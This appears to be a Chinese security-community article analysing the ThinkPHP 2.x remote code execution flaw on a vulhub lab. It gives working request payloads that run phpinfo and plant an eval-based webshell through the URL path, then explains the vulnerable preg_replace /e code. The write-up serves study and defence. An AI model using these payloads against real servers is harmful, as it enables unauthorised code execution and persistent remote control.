#  ThinkPHP系列漏洞分析-2.x任意代码执行   
原创 Fariy  火线Zone   2022-06-13 18:00  
  
文章首发于：  
  
火线Zone社区（https://zone.huoxian.cn/）  
  
  
**环境部署**  
  
  
  
使用vulhub进行部署  
https://vulhub.org/，具体参考百度即可。  
  
  
**启动环境**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APXGV810gfbr1pqnavl6u2jHyfPva3jUicuDo49ic7bVXbNnSloF95gYo4Q/640?wx_fmt=png "")  
  
  
**访问环境**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APXGzjQdmH8Y7TI4ibyEPD2IpIm4qFFr8HvwMqr4ZnOBNd4lfvO8IefWJw/640?wx_fmt=png "")  
  
  
**漏洞利用条件**  
  
  
  
thinkphp2.x或ThinkPHP3.0[因3.0版本Lite模式下没有修复该漏洞] && PHP版本为5.6.29以下  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APXeZ3jh1vaDdVPpkzIj2uDUEaQl4aZpq8TNvMnTNZ1vu86T6jfoArM9w/640?wx_fmt=png "")  
  
  
通过报错和查看网络报文可以看到thinkphp为2.1版本，PHP为5.5.38。  
  
  
**漏洞利用**  
  
  
**查看phpinfo**  
  
http://xxxxx:8080/index.php?s=/index/index/xxx/${@phpinfo()}  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APX0XF4EdXHuj7SOQKlCBsft7a8pgA0wo5MZibiaSiaBduZdfoewebiao4DSQ/640?wx_fmt=png "")  
  
  
**构造一句话木马**  
  
http://xxxxx:8080/index.php?s=/index/index/xxx/${@print(eval($_POST[1]))}这里直接将url构造好，复制到蚁剑一键连接即可，此方法不需要将一句话木马写到服务器上。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APX34WOEmSu9SdVKCuKJk4ABmiaicibpg3sibpR6ic84xuzTv9cpNp2CHicrHuQ/640?wx_fmt=png "")  
  
  
到此漏洞利用结束。  
  
  
**漏洞原理**  
  
  
  
漏洞存在的文件：  
/ThinkPHP/Lib/Think/Util/Dispatcher.class.php  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APXacItTKCFjJBqYMiagFib01fFVDWoEnpzhqoEon1vyoygziaQbDD6QcReA/640?wx_fmt=png "")  
  
  
**关键漏洞代码**  
  
```
self::getPathInfo();

if(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
  $paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
  $var  =  array();
  if (C('APP_GROUP_LIST') && !isset($_GET[C('VAR_GROUP')])){
    $var[C('VAR_GROUP')] = in_array(strtolower($paths[0]),explode(',',strtolower(C('APP_GROUP_LIST'))))? array_shift($paths) : '';
    if(C('APP_GROUP_DENY') && in_array(strtolower($var[C('VAR_GROUP')]),explode(',',strtolower(C('APP_GROUP_DENY'))))) {
      // 禁止直接访问分组
      exit;
    }
  }
  if(!isset($_GET[C('VAR_MODULE')])) {// 还没有定义模块名称
    $var[C('VAR_MODULE')]  =   array_shift($paths);
  }
  $var[C('VAR_ACTION')]  =   array_shift($paths);
  // 解析剩余的URL参数
  $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
  $_GET   =  array_merge($var,$_GET);
        }
```  
  
  
preg_replace('正则规则','替换字符','目标字符') /e为执行模式  
  
如果该正则规则表达式中使用了/e修饰符，那么就会存在代码执行漏洞  
  
thinkphp2.x有漏洞的代码是：  
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));  
  
对应上面的表达式就是  
  
```
正则表达式：'@(\w+)'.$depr.'([^'.$depr.'\/]+)@e'
替换字符：'$var[\'\\1\']="\\2";'
目标字符：implode($depr,$paths))
```  
  
  
可控的位置是implode($depr,$paths))  
  
implode是将数组拼接成字符串，作用是将传过来的$path，以$depr为分隔连接起来。$depr表示网页路径的"分隔符"[也就是当前目录"/"]；  
  
$path是从  
$paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'))传递过来的，explode是将字符串以$depr打散成数组，也就是把a/b/c${@print(eval($_POST[1]))}打散重组。  
  
  
**正则表达式匹配的分析**  
  
  
首先\w+匹配到一个以上字符，接下来$depr匹配到一个网页路径分隔符，([^'.$depr.'\/]+)，首先[abcd]表示匹配abcd以外的所有字符，因此，原式所匹配的规则为匹配一个或多个除网页分隔符和"\"以外的字符，将输入匹配到的结果为a/b,c/${@print(eval($_POST[1]))}，php这里的@符号，可能是为了防止出现不必要的报错。【尝试将@去掉，并没有报错】  
  
  
**preg_replace函数理解**  
  
  
preg_replace('/aaa(+?)aaa/ies',$a,$b)'i'取消大小写敏感，当$a为一个可以传递参数的函数例如test(),$b为一个匹配到正则表达式的字符串如"aaaaabbbbaaaaa"，最后输出的结果是test(bbbb)，函数处理的结果加上了[aaaa]  
  
原本应该被匹配掉的替换了bbbb竟然被作为了参数传入了替换的函数中去，并且被执行了，所以当替换目标字符可控，我们就可以构造想要被执行的函数，比如写个一句话木马。  
  
这里还有一个知识点就是${}里面写的变量名为已知函数名称时，函数会被执行，输出结果会以报错的形式回显。  
  
  
**为什么是index.php**  
  
```
ThinkPHP5.1在没有定义路由的情况下典型的URL访问规则是：
http://servername/index.php（或者其他入口文件）/模块/控制器/操作/[参数名/参数值]
如果不支持APTHINFO的服务器可以使用兼容模式访问如下：
http://servername/index.php（或者其他入口文件）?s=/模块/控制器/操作/[参数名/参数值]
```  
  
  
团队博客：www.meta-sec.top  
  
  
  
  
**【火线Zone云安全社区群】**  
  
进群可以与技术大佬互相交流  
  
进群有机会免费领取节假日礼品  
  
进群可以免费观看技术分享直播  
  
识别二维码回复**【社区群】**进群  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSNGVibIpu9mzOH0H0nVQHEc1By10hScvF8Liaxo8ooV3icz3UqNrr1VpsKvJv60QRjyoYrIXNQDRokw/640?wx_fmt=jpeg "")  
  
  
**【火线Zone社区周激励】**  
  
2022.6.6～ 2022.6.12公告  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRcibqxjGNicIPPU0JSKI1APXcL0tFG36TxDUVgZUM3waniaBu2PAlkZhQiaEcCkocfpRZ2fianqIcZ2Fg/640?wx_fmt=png "")  
  
  
**【相关精选文章】**  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495445&idx=1&sn=e519f4bfb8e76749687e7830badacb02&chksm=eaa96735dddeee23f86bbb892f097699e4084c803c9c6039beb15115c2db7dbeff4cfb655bd7&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247495333&idx=1&sn=9755710f94313465c47776cbf0048327&chksm=eaa96685dddeef935cba3f148a6079f14130746ab0cffb2486222bb0faab8a33c2edcb6fd141&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSNGVibIpu9mzOH0H0nVQHEceQbM5X6hg1GvARGwlHB4ILTrlbsQdpyuNzH6vVm6ufkTn2hZiajpFmA/640?wx_fmt=png "")  
  
火线Zone是[火线安全平台]运营的云安全社区，内容涵盖云计算、云安全、漏洞分析、攻防等热门主题，研究讨论云安全相关技术，助力所有云上用户实现全面的安全防护。欢迎具备分享和探索精神的云上用户加入火线Zone社区，共建一个云安全优质社区！  
  
如需转载火线Zone公众号内的文章请联系火线小助手：hxanquan（微信）  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSNGVibIpu9mzOH0H0nVQHEcpyuRSE2cy6vUP2y4UTCME52eibK0GjYckLr6oTtxhLYHqYR1HB4B3sw/640?wx_fmt=jpeg "")  
  
//  火线Zone  
   
//  
  
微信号 : huoxian_zone  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CkzQxaHZX9KdW919vwagVwhCeicQPXuMGibHcf2WqiaFyvfy5p1oIk1C5SOdtTyLlQmOtEia7FMKicknJzGTmYLWb2Q/640?wx_fmt=gif "")  
  
点击阅读原文，加入社区，共建一个有技术氛围的优质社区！  
